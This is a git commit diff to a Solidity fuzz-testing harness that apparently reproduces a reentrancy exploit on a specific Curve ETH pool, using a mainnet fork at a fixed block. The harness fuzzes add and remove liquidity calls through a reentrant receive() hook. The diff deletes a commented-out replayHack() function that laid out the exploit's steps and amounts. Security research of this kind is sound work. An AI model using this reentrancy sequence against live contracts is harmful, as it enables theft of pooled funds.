7a311569c9f3b9477cdbc1344f1509987a478191
Rappie <jasper@rappie.com>
2024-07-15 16:52:11 +0200

    Optimization & Cleanup

--- src/fuzz/Fuzz.sol
+++ src/fuzz/Fuzz.sol
@@ -1,14 +1,27 @@
 // SPDX-License-Identifier: MIT
-import {FuzzSetup} from "./FuzzSetup.sol";
+pragma solidity ^0.8;
 
-contract Fuzz is FuzzSetup {
-    bool performReentrancy = false;
+import {FuzzBase} from "fuzzlib/FuzzBase.sol";
+
+import {ICurve} from "src/interfaces/ICurve.sol";
+import {WETH9} from "src/interfaces/WETH9.sol";
+
+contract Fuzz is FuzzBase {
+    WETH9 WETH = WETH9(payable(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2));
+    ICurve pool = ICurve(0x9848482da3Ee3076165ce6497eDA906E66bB85C5);
+
+    uint256 initialBalance;
 
     bool reentrancyEnabled;
     uint8 reentrancyFunction;
-    uint256 reentrancyAmount;
+    uint128 reentrancyAmount;
 
-    constructor() payable FuzzSetup() {}
+    constructor() payable {
+        vm.roll(17806055);
+        vm.warp(1690722623);
+
+        initialBalance = address(this).balance;
+    }
 
     function testProfit() public {
         uint256 balance = address(this).balance;
@@ -16,11 +29,12 @@ contract Fuzz is FuzzSetup {
         log("initial balance", initialBalance);
         log("current balance", balance);
 
+        // eq(initialBalance, balance, "Profit test");
         gte(initialBalance, balance, "Profit test");
     }
 
-    function addLiquidity(uint256 _amount) public {
-        _amount = clampBetween(_amount, 0, address(this).balance);
+    function addLiquidity(uint128 _amount) public {
+        _amount = uint128(clampBetween(_amount, 0, address(this).balance));
 
         uint256[2] memory amount;
         amount[0] = _amount;
@@ -29,8 +43,10 @@ contract Fuzz is FuzzSetup {
         pool.add_liquidity{value: _amount}(amount, 0);
     }
 
-    function removeLiquidity(uint256 _amount) public {
-        _amount = clampBetween(_amount, 0, pool.balanceOf(address(this)));
+    function removeLiquidity(uint128 _amount) public {
+        _amount = uint128(
+            clampBetween(_amount, 0, pool.balanceOf(address(this)))
+        );
 
         uint256[2] memory amount;
         amount[0] = 0;
@@ -42,7 +58,7 @@ contract Fuzz is FuzzSetup {
     function updateReentrancy(
         bool _reentrancyEnabled,
         uint8 _reentrancyFunction,
-        uint256 _reentrancyAmount
+        uint128 _reentrancyAmount
     ) public {
         reentrancyEnabled = _reentrancyEnabled;
         reentrancyFunction = _reentrancyFunction;
@@ -51,7 +67,7 @@ contract Fuzz is FuzzSetup {
 
     receive() external payable {
         if (reentrancyEnabled) {
-            uint256 functionId = (reentrancyFunction == 1) ? 0 : 1;
+            uint256 functionId = (reentrancyFunction % 2 == 1) ? 0 : 1;
 
             if (reentrancyFunction == 0) {
                 addLiquidity(reentrancyAmount);
@@ -61,40 +77,4 @@ contract Fuzz is FuzzSetup {
         }
     }
 
-    // function replayHack() public {
-    //     uint256 balance = address(this).balance;
-    //     log("initial balance", balance);
-    //
-    //     uint256[2] memory amount;
-    //     amount[0] = 40_000 ether;
-    //     amount[1] = 0;
-    //     pool.add_liquidity{value: 40_000 ether}(amount, 0);
-    //     log("balance after add liquidity", address(this).balance);
-    //
-    //     performReentrancy = true;
-    //     amount[0] = 0;
-    //     pool.remove_liquidity(pool.balanceOf(address(this)), amount);
-    //     performReentrancy = false;
-    //     log("balance after remove liquidity #1", address(this).balance);
-    //
-    //     pool.remove_liquidity(10_272 ether, amount);
-    //     log("balance after remove liquidity #2", address(this).balance);
-    //
-    //     log("final balance", address(this).balance);
-    //     log("profit", address(this).balance - balance);
-    // }
-
-    // receive() external payable {
-    //     if (performReentrancy) {
-    //         uint256[2] memory amount;
-    //         amount[0] = 40_000 ether;
-    //         amount[1] = 0;
-    //         pool.add_liquidity{value: 40_000 ether}(amount, 0);
-    //
-    //         log(
-    //             "balance after add liquidity (reentrancy)",
-    //             address(this).balance
-    //         );
-    //     }
-    // }
 }
